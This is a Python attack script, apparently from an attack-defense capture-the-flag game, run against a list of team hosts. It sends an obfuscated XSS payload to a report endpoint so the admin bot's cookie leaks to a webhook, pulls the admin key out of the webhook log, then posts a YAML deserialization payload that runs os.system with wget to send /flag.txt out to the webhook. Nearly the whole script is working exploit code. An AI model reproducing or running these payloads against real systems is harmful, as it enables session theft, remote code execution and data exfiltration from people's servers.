#!/usr/bin/env python3
from exploitfarm import *
import requests
import re
from urllib.parse import urlparse, parse_qs

def extract_admin_key_from_text(text: str):
    """
    Search `text` for occurrences of 'admin-key=...' and return the first match.
    Handles:
      - ?admin-key=VALUE
      - ?xxx=admin-key=VALUE
      - JSON blobs that include such a URL
    Returns the key string or None if not found.
    """
    # 1) Quick regex search anywhere in the text
    m = re.search(r'admin-key=([A-Za-z0-9]+)', text)
    if m:
        return m.group(1)

    # 2) Try to parse text as JSON and look for values that contain a URL with admin-key
    try:
        j = json.loads(text)
    except Exception:
        j = None

    def find_in_obj(obj):
        if isinstance(obj, str):
            # try parse as url and query params
            parsed = urlparse(obj)
            if parsed.query:
                qs = parse_qs(parsed.query)
                # case: `?admin-key=...`
                if 'admin-key' in qs and qs['admin-key']:
                    return qs['admin-key'][0]
                # case: `?xxx=admin-key=...`
                for vlist in qs.values():
                    for v in vlist:
                        m2 = re.search(r'admin-key=([A-Za-z0-9]+)', v)
                        if m2:
                            return m2.group(1)
        elif isinstance(obj, dict):
            for k, v in obj.items():
                found = find_in_obj(v)
                if found:
                    return found
        elif isinstance(obj, list):
            for item in obj:
                found = find_in_obj(item)
                if found:
                    return found
        return None

    if j is not None:
        found = find_in_obj(j)
        if found:
            return found

    # 3) Last resort: try to find URLs in the raw text and parse their querystring
    for possible_url in re.findall(r'https?://[^\s\'"<>]+', text):
        parsed = urlparse(possible_url)
        if parsed.query:
            qs = parse_qs(parsed.query)
            if 'admin-key' in qs and qs['admin-key']:
                return qs['admin-key'][0]
            for vlist in qs.values():
                for v in vlist:
                    m3 = re.search(r'admin-key=([A-Za-z0-9]+)', v)
                    if m3:
                        return m3.group(1)

    return None

def get_ip_port(data, key):
    key = str(key)  # ensure string for lookup
    return data.get("data", {}).get(key, [None])[0]

team_id = get_host()
# team_id = "6"
json_data = {'data': {'6': ['10.0.38.15:40001'], '7': ['10.0.38.15:40003'], '8': ['10.0.38.15:40005'], '9': ['10.0.38.15:40007'], '10': ['10.0.38.15:40009'], '11': ['10.0.38.15:40011'], '12': ['10.0.38.15:40013'], '13': ['10.0.38.15:40015'], '14': ['10.0.38.15:40017'], '15': ['10.0.38.15:40019'], '16': ['10.0.38.15:40021'], '17': ['10.0.38.15:40023'], '18': ['10.0.38.15:40025'], '19': ['10.0.38.15:40027'], '20': ['10.0.38.15:40029']}, 'status': 'success'}
host = get_ip_port(json_data, team_id)
if host is None:
    print("[-] No host found for team ID:", team_id)

payload = 'http://127.0.0.1:5000/web/guess?q=%27%27%0Aonerror%20=%20eval%0Athrow%20%27=location=\\x22\\x2f\\x2f\\x6c\\x6f\\x63\\x61\\x6c\\x68\\x6f\\x73\\x74\\x3a\\x35\\x30\\x30\\x30\\x2f\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b\\x2f\\x63\\x61\\x70\\x74\\x75\\x72\\x65\\x2f\\x35\\x38\\x37\\x64\\x61\\x63\\x38\\x62\\x2d\\x34\\x61\\x61\\x33\\x2d\\x34\\x31\\x38\\x32\\x2d\\x61\\x64\\x65\\x35\\x2d\\x30\\x31\\x61\\x33\\x62\\x66\\x61\\x36\\x32\\x36\\x65\\x39\\x3f\\x78\\x78\\x78\\x3d\\x22\\x2b\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x63\\x6f\\x6f\\x6b\\x69\\x65\\x2b\\x22\\x61\\x61\\x61\\x22%27%0A'
try:
    requests.post(f'http://{host}/web/report', data={'url': payload},
        # proxies={"http": "http://localhost:8080", "https": "http://localhost:8080"}, verify=False
    )
except Exception as e:
    print("[-] Exception during POST /web/report:", e)
    exit(1)

try:
    res = requests.get(f'http://{host}/webhook/view/587dac8b-4aa3-4182-ade5-01a3bfa626e9',
        # proxies={"http": "http://localhost:8080", "https": "http://localhost:8080"}, verify=False
    )
except Exception as e:
    print("[-] Exception during GET /webhook/view:", e)
    exit(1)
key = extract_admin_key_from_text(res.text).replace("aaa", "")
print("[+] Extracted admin key:", key)

payload = """!!python/object/apply:os.system ["wget http://127.0.0.1:5000/webhook/capture/587dac8b-4aa3-4182-ade5-01a3bfa626e9?x=`cat /flag.txt`"]
"""
data = {
    "yaml_data": payload  # example YAML payload
}
cookies = {
    "admin-key": key
}

try:
    resp = requests.post(f'http://{host}/web/yaml', data=data, cookies=cookies)
except Exception as e:
    print("[-] Exception during POST /web/yaml:", e)
    exit(1)

try:
    res = requests.get(f'http://{host}/webhook/view/587dac8b-4aa3-4182-ade5-01a3bfa626e9',
        # proxies={"http": "http://localhost:8080", "https": "http://localhost:8080"}, verify=False
    )
except Exception as e:
    print("[-] Exception during final GET /webhook/view:", e)
    exit(1)
print(res.text)